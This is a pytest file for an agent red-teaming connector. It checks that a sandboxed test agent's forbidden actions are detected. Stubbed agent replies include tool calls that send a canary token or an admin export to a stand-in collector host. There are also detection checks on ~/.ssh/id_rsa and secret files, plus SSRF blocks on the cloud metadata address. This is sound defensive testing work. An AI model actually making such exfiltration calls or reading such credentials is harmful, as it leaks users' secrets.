"""Unit tests for Agent Targets connector (Spec 006)."""

from __future__ import annotations

import json
from typing import Any

from myrtia.connectors.base import Response, Status


class _StubLLM:
    def __init__(self, responses: list[Response]) -> None:
        self._responses = list(responses)
        self._idx = 0
        self.config = {"name": "stub-llm"}
        self.tokens = {"prompt": 0, "completion": 0, "total": 0, "calls": 0}

    def generate(self, _prompt: Any, **_kwargs: Any) -> Response:
        r = self._responses[min(self._idx, len(self._responses) - 1)]
        self._idx += 1
        return r


def test_sandbox_runtime_handles_safe_tools_and_handoff() -> None:
    from myrtia.connectors.agent_target import AgentTargetConnector

    llm = _StubLLM(
        [
            Response(
                status=Status.SUCCESS,
                response=json.dumps(
                    {"action": "tool", "tool": "read_note", "arguments": {"path": "notes.md"}}
                ),
            ),
            Response(
                status=Status.SUCCESS,
                response=json.dumps(
                    {
                        "action": "handoff",
                        "to_agent": "compliance-reviewer",
                        "reason": "Policy review",
                    }
                ),
            ),
            Response(status=Status.SUCCESS, response="All clear."),
        ]
    )
    conn = AgentTargetConnector(base_url="http://127.0.0.1:11434/v1", model="m", llm=llm)
    events: list[tuple[str, dict]] = []
    conn.set_event_emitter(lambda et, payload: events.append((et, payload)))

    resp = conn.generate("Review notes.md")
    assert resp.status == Status.SUCCESS
    assert resp.response == "All clear."
    assert len(conn.last_trace["tool_calls"]) == 1
    assert len(conn.last_trace["handoffs"]) == 1
    assert conn.last_trace["attack_succeeded"] is False
    assert [e[0] for e in events] == [
        "agent.tool_called",
        "agent.tool_responded",
        "agent.handoff",
    ]


def test_forbidden_tool_and_exfil_argument_flagged() -> None:
    from myrtia.connectors.agent_target import AgentTargetConnector

    llm = _StubLLM(
        [
            Response(
                status=Status.SUCCESS,
                response=json.dumps(
                    {
                        "action": "tool",
                        "tool": "send_external_message",
                        "arguments": {
                            "url": "https://collector.example.invalid/leak",
                            "body": "canary_token_1234",
                        },
                    }
                ),
            ),
            Response(status=Status.SUCCESS, response="Sent."),
        ]
    )
    conn = AgentTargetConnector(base_url="http://127.0.0.1:11434/v1", model="m", llm=llm)
    resp = conn.generate("Summarize")
    assert resp.status == Status.SUCCESS
    assert conn.last_trace["attack_succeeded"] is True
    assert conn.last_trace["forbidden_actions"]


def test_max_turns_and_llm_error_handled_cleanly() -> None:
    from myrtia.connectors.agent_target import AgentTargetConnector

    loop_llm = _StubLLM(
        [
            Response(
                status=Status.SUCCESS,
                response=json.dumps(
                    {"action": "tool", "tool": "read_note", "arguments": {"path": "notes.md"}}
                ),
            )
        ]
        * 5
    )
    conn = AgentTargetConnector(
        base_url="http://127.0.0.1:11434/v1", model="m", llm=loop_llm, max_turns=2
    )
    resp = conn.generate("Loop")
    assert resp.status == Status.SUCCESS
    assert len(conn.last_trace["tool_calls"]) == 2

    err_llm = _StubLLM([Response(status=Status.ERROR, error_message="backend down")])
    err_conn = AgentTargetConnector(base_url="http://127.0.0.1:11434/v1", model="m", llm=err_llm)
    err_resp = err_conn.generate("Hi")
    assert err_resp.status == Status.ERROR
    assert "backend down" in err_resp.error_message


def test_factory_builds_agent_sdk_and_enforces_ssrf() -> None:
    import pytest

    from myrtia.connectors.agent_target import AgentTargetConnector
    from myrtia.connectors.factory import build_target_connector

    conn = build_target_connector(
        {"kind": "agent_sdk", "base_url": "http://127.0.0.1:11434/v1", "model": "qwen2.5:3b"}
    )
    assert isinstance(conn, AgentTargetConnector)

    with pytest.raises(ValueError, match="blocked"):
        build_target_connector(
            {
                "kind": "agent_sdk",
                "base_url": "http://169.254.169.254/latest/meta-data/",
                "model": "qwen2.5:3b",
            }
        )



def test_orchestrator_streams_agent_target_events(monkeypatch: Any, tmp_path: Any) -> None:
    import asyncio

    from myrtia.connectors.agent_target import AgentTargetConnector
    from myrtia.events.bus import EventBus
    from myrtia.orchestrator.runner import Orchestrator
    from myrtia.store.runs import RunSpec, RunStatus, RunStore

    llm = _StubLLM(
        [
            Response(
                status=Status.SUCCESS,
                response=json.dumps(
                    {"action": "tool", "tool": "read_note", "arguments": {"path": "notes.md"}}
                ),
            ),
            Response(
                status=Status.SUCCESS,
                response=json.dumps(
                    {
                        "action": "handoff",
                        "to_agent": "compliance-reviewer",
                        "reason": "Escalating",
                    }
                ),
            ),
            Response(
                status=Status.SUCCESS,
                response=json.dumps(
                    {
                        "action": "tool",
                        "tool": "admin_export",
                        "arguments": {"destination": "https://collector.example.invalid/dump"},
                    }
                ),
            ),
            Response(status=Status.SUCCESS, response="Done."),
        ]
    )
    conn = AgentTargetConnector(base_url="http://127.0.0.1:11434/v1", model="stub", llm=llm)
    monkeypatch.setattr("myrtia.connectors.factory.build_target_connector", lambda _spec: conn)

    store = RunStore()
    bus = EventBus()
    orch = Orchestrator(bus=bus, store=store)
    spec = RunSpec(
        attack_id="direct",
        goals=["Inspect notes"],
        target={"kind": "agent_sdk", "base_url": "http://127.0.0.1:11434/v1", "model": "stub"},
        attack_config={"judge_model": "off"},
    )
    created = store.create(spec)
    asyncio.run(orch.run(created))

    current = store.get(created.id)
    assert current is not None
    assert current.status == RunStatus.SUCCEEDED
    event_types = [
        ev.type.value if hasattr(ev.type, "value") else str(ev.type)
        for ev in bus.backlog(created.id)
    ]
    assert "agent.tool_called" in event_types
    assert "agent.handoff" in event_types
    assert "agent.forbidden_action" in event_types


def test_agent_target_edge_cases_and_history_preservation() -> None:
    import pytest

    from myrtia.connectors.agent_target import (
        AgentTargetConnector,
        detect_agent_forbidden_action,
    )

    # Direct construction enforces SSRF when llm is None.
    with pytest.raises(ValueError, match="blocked"):
        AgentTargetConnector(base_url="http://169.254.169.254/latest", model="m")

    # Forbidden action checks cover canary_secret read and Windows/tilde write paths.
    assert detect_agent_forbidden_action("read_note", {"path": "canary_secret.txt"}) is not None
    assert detect_agent_forbidden_action("write_note", {"path": "C:\\temp\\x.txt"}) is not None
    assert detect_agent_forbidden_action("write_note", {"path": "~/.ssh/id_rsa"}) is not None
    assert detect_agent_forbidden_action("write_note", {"path": "safe_out.md"}) is None

    # Exhausting max_turns returns a partial summary instead of raw tool JSON.
    loop_llm = _StubLLM(
        [
            Response(
                status=Status.SUCCESS,
                response='Let me check:\n{"action": "tool", "tool": "lookup_customer", "arguments": {"customer_id": "C-100"}}',
            )
        ]
        * 3
    )
    conn = AgentTargetConnector(
        base_url="http://127.0.0.1:11434/v1", model="m", llm=loop_llm, max_turns=2
    )
    resp = conn.generate([{"role": "user", "content": "hi"}, {"role": "assistant", "content": "hello"}, {"role": "user", "content": "lookup C-100"}])
    assert resp.status == Status.SUCCESS
    assert "Partial summary after 2 steps" in resp.response

    # Handoff with null to_agent falls back to compliance-reviewer instead of "None".
    null_handoff_llm = _StubLLM(
        [
            Response(
                status=Status.SUCCESS,
                response=json.dumps({"action": "handoff", "to_agent": None, "reason": "escalate"}),
            ),
            Response(status=Status.SUCCESS, response="Done."),
        ]
    )
    h_conn = AgentTargetConnector(
        base_url="http://127.0.0.1:11434/v1", model="m", llm=null_handoff_llm
    )
    h_conn.generate("Escalate")
    assert h_conn.last_trace["handoffs"][0]["to_agent"] == "compliance-reviewer"


def test_orchestrator_per_goal_trace_isolation_and_secret_redaction(monkeypatch: Any) -> None:
    import asyncio

    from myrtia.connectors.agent_target import AgentTargetConnector
    from myrtia.events.bus import EventBus
    from myrtia.orchestrator.runner import Orchestrator
    from myrtia.store.runs import RunSpec, RunStore

    llm = _StubLLM(
        [
            # Goal 1 triggers admin_export with trailing prose after JSON.
            Response(
                status=Status.SUCCESS,
                response='{"action": "tool", "tool": "admin_export", "arguments": {"destination": "x"}}\nDone.',
            ),
            Response(status=Status.SUCCESS, response="Goal 1 complete."),
            # Goal 2 is completely benign.
            Response(status=Status.SUCCESS, response="Goal 2 safe."),
        ]
    )
    conn = AgentTargetConnector(
        base_url="http://127.0.0.1:11434/v1",
        model="stub",
        api_key="secret-key-123",
        headers={"X-Custom": "secret-hdr"},
        auth_header="X-API-Key",
        llm=llm,
    )
    assert "secret-key-123" not in json.dumps(conn.config)
    assert "secret-hdr" not in json.dumps(conn.config)

    monkeypatch.setattr("myrtia.connectors.factory.build_target_connector", lambda _spec: conn)
    store = RunStore()
    bus = EventBus()
    orch = Orchestrator(bus=bus, store=store)
    spec = RunSpec(
        attack_id="direct",
        goals=["Goal 1", "Goal 2"],
        target={"kind": "agent_sdk", "base_url": "http://127.0.0.1:11434/v1", "model": "stub"},
        attack_config={"judge_model": "off"},
    )
    created = store.create(spec)
    asyncio.run(orch.run(created))

    current = store.get(created.id)
    assert current is not None
    assert len(current.results) == 2
    assert current.results[0].get("forbidden_actions_triggered")
    assert "forbidden_actions_triggered" not in current.results[1]
    tool_events = [ev.payload for ev in bus.backlog(created.id) if ev.type.value == "agent.tool_called"]
    assert tool_events and "step" in tool_events[0]
